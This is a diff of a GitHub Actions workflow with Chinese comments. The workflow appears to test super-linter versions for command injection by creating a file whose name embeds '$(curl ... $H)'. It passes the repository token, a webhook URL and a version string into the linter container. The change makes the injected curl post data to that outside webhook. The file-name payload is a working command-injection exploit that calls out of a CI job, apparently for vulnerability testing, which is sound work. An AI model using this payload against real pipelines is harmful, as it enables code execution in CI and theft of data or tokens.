@@ -39,7 +39,7 @@ jobs:
           # 文件名: pre$(curl${IFS}-X${IFS}POST${IFS}$H).md
           # 我们用 ${IFS} 替代空格，防止 parallel 或 shell 在参数分割时出问题
           # $H 是后面传入的 Webhook URL
-          PAYLOAD_NAME='pre$(curl${IFS}-X${IFS}POST${IFS}$H).md'
+          PAYLOAD_NAME='pre$(curl${IFS}-d${IFS}$V${IFS}$H).md'
           
           echo "Creating malicious file: $PAYLOAD_NAME"
           touch "$PAYLOAD_NAME"
@@ -57,8 +57,9 @@ jobs:
           echo "Testing version: ${{ inputs.target_version }}"
           echo "Diff Range: ${{ env.MASTER_SHA }} ... ${{ env.CURRENT_SHA }}"
           
-          # 环境变量法：把 URL 传给 H
-          # 显式指定 BEFORE_SHA，强迫它算出 Diff
+          # 构造要发送的数据字符串，例如: version=v7
+          # 这样传进去最安全，不用担心文件名里有等号或者其他怪字符
+          DATA_STRING="version=${{ inputs.target_version }}"
           
           docker run --rm \
             -e RUN_LOCAL=true \
@@ -68,6 +69,7 @@ jobs:
             -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
             -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
             -e H="${{ inputs.webhook_url }}" \
+            -e V="$DATA_STRING" \
             -v "$(pwd):/tmp/lint" \
             ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
             
